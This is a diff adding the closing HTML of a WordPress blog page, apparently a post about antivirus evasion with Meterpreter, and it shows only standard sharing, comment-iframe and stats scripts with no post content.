+						<input type="text" id="jetpack-source_f_name" name="source_f_name" class="input" value="" size="25" autocomplete="off" title="This field is for validation and should not be changed" />
+			
+			<img style="float: right; display: none" class="loading" src="https://www.christophertruncer.com/wp-content/plugins/jetpack/modules/sharedaddy/images/loading.gif" alt="loading" width="16" height="16" />
+			<input type="submit" value="Send Email" class="sharing_send" />
+			<a rel="nofollow" href="#cancel" class="sharing_cancel" role="button">Cancel</a>
+
+			<div class="errors errors-1" style="display: none;">
+				Post was not sent - check your email addresses!			</div>
+
+			<div class="errors errors-2" style="display: none;">
+				Email check failed, please try again			</div>
+
+			<div class="errors errors-3" style="display: none;">
+				Sorry, your blog cannot share posts by email.			</div>
+		</form>
+	</div>
+<script type='text/javascript' src='https://secure.gravatar.com/js/gprofiles.js?ver=202044' id='grofiles-cards-js'></script>
+<script type='text/javascript' id='wpgroho-js-extra'>
+/* <![CDATA[ */
+var WPGroHo = {"my_hash":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.christophertruncer.com/wp-content/plugins/jetpack/modules/wpgroho.js?ver=9.0.2' id='wpgroho-js'></script>
+<script type='text/javascript' src='https://www.christophertruncer.com/wp-content/themes/typo-wpcom/js/navigation.js?ver=20120206' id='typo-navigation-js'></script>
+<script type='text/javascript' src='https://www.christophertruncer.com/wp-content/themes/typo-wpcom/js/skip-link-focus-fix.js?ver=20130115' id='typo-skip-link-focus-fix-js'></script>
+<script type='text/javascript' src='https://www.christophertruncer.com/wp-includes/js/comment-reply.min.js?ver=1047b40d9f4deac2ccce36a1918592b9' id='comment-reply-js'></script>
+<script type='text/javascript' src='https://www.christophertruncer.com/wp-content/plugins/jetpack/_inc/build/twitter-timeline.min.js?ver=4.0.0' id='jetpack-twitter-timeline-js'></script>
+<script type='text/javascript' src='https://www.christophertruncer.com/wp-includes/js/wp-embed.min.js?ver=1047b40d9f4deac2ccce36a1918592b9' id='wp-embed-js'></script>
+<script async="async" type='text/javascript' src='https://www.christophertruncer.com/wp-content/plugins/akismet/_inc/form.js?ver=4.1.7' id='akismet-form-js'></script>
+<script type='text/javascript' id='sharing-js-js-extra'>
+/* <![CDATA[ */
+var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.christophertruncer.com/wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js?ver=9.0.2' id='sharing-js-js'></script>
+<script type='text/javascript' id='sharing-js-js-after'>
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-twitter', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
+				return false;
+			});
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-linkedin', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
+				return false;
+			});
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-facebook', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
+				return false;
+			});
+</script>
+
+		<!--[if IE]>
+		<script type="text/javascript">
+			if ( 0 === window.location.hash.indexOf( '#comment-' ) ) {
+				// window.location.reload() doesn't respect the Hash in IE
+				window.location.hash = window.location.hash;
+			}
+		</script>
+		<![endif]-->
+		<script type="text/javascript">
+			(function () {
+				var comm_par_el = document.getElementById( 'comment_parent' ),
+					comm_par = ( comm_par_el && comm_par_el.value ) ? comm_par_el.value : '',
+					frame = document.getElementById( 'jetpack_remote_comment' ),
+					tellFrameNewParent;
+
+				tellFrameNewParent = function () {
+					if ( comm_par ) {
+						frame.src = "https://jetpack.wordpress.com/jetpack-comment/?blogid=14525251&postid=269&comment_registration=0&require_name_email=1&stc_enabled=1&stb_enabled=1&show_avatars=1&avatar_default=retro&greeting=Leave+a+Reply&greeting_reply=Leave+a+Reply+to+%25s&color_scheme=light&lang=en_US&jetpack_version=9.0.2&show_cookie_consent=10&has_cookie_consent=0&token_key=%3Bnormal%3B&sig=54b9a875769f1371484bfd30a7ba4df4fba37813#parent=https%3A%2F%2Fwww.christophertruncer.com%2Fbypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun%2F" + '&replytocom=' + parseInt( comm_par, 10 ).toString();
+					} else {
+						frame.src = "https://jetpack.wordpress.com/jetpack-comment/?blogid=14525251&postid=269&comment_registration=0&require_name_email=1&stc_enabled=1&stb_enabled=1&show_avatars=1&avatar_default=retro&greeting=Leave+a+Reply&greeting_reply=Leave+a+Reply+to+%25s&color_scheme=light&lang=en_US&jetpack_version=9.0.2&show_cookie_consent=10&has_cookie_consent=0&token_key=%3Bnormal%3B&sig=54b9a875769f1371484bfd30a7ba4df4fba37813#parent=https%3A%2F%2Fwww.christophertruncer.com%2Fbypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun%2F";
+					}
+				};
+
+				
+				if ( 'undefined' !== typeof addComment ) {
+					addComment._Jetpack_moveForm = addComment.moveForm;
+
+					addComment.moveForm = function ( commId, parentId, respondId, postId ) {
+						var returnValue = addComment._Jetpack_moveForm( commId, parentId, respondId, postId ),
+							cancelClick, cancel;
+
+						if ( false === returnValue ) {
+							cancel = document.getElementById( 'cancel-comment-reply-link' );
+							cancelClick = cancel.onclick;
+							cancel.onclick = function () {
+								var cancelReturn = cancelClick.call( this );
+								if ( false !== cancelReturn ) {
+									return cancelReturn;
+								}
+
+								if ( ! comm_par ) {
+									return cancelReturn;
+								}
+
+								comm_par = 0;
+
+								tellFrameNewParent();
+
+								return cancelReturn;
+							};
+						}
+
+						if ( comm_par == parentId ) {
+							return returnValue;
+						}
+
+						comm_par = parentId;
+
+						tellFrameNewParent();
+
+						return returnValue;
+					};
+				}
+
+				
+				// Do the post message bit after the dom has loaded.
+				document.addEventListener( 'DOMContentLoaded', function () {
+					var iframe_url = "https:\/\/jetpack.wordpress.com";
+					if ( window.postMessage ) {
+						if ( document.addEventListener ) {
+							window.addEventListener( 'message', function ( event ) {
+								var origin = event.origin.replace( /^http:\/\//i, 'https://' );
+								if ( iframe_url.replace( /^http:\/\//i, 'https://' ) !== origin ) {
+									return;
+								}
+								jQuery( frame ).height( event.data );
+							});
+						} else if ( document.attachEvent ) {
+							window.attachEvent( 'message', function ( event ) {
+								var origin = event.origin.replace( /^http:\/\//i, 'https://' );
+								if ( iframe_url.replace( /^http:\/\//i, 'https://' ) !== origin ) {
+									return;
+								}
+								jQuery( frame ).height( event.data );
+							});
+						}
+					}
+				})
+
+			})();
+		</script>
+
+		<script type='text/javascript' src='https://stats.wp.com/e-202044.js' async='async' defer='defer'></script>
+<script type='text/javascript'>
+	_stq = window._stq || [];
+	_stq.push([ 'view', {v:'ext',j:'1:9.0.2',blog:'14525251',post:'269',tz:'-6',srv:'www.christophertruncer.com'} ]);
+	_stq.push([ 'clickTrackerInit', '14525251', '269' ]);
+</script>
+
+</body>
+</html>
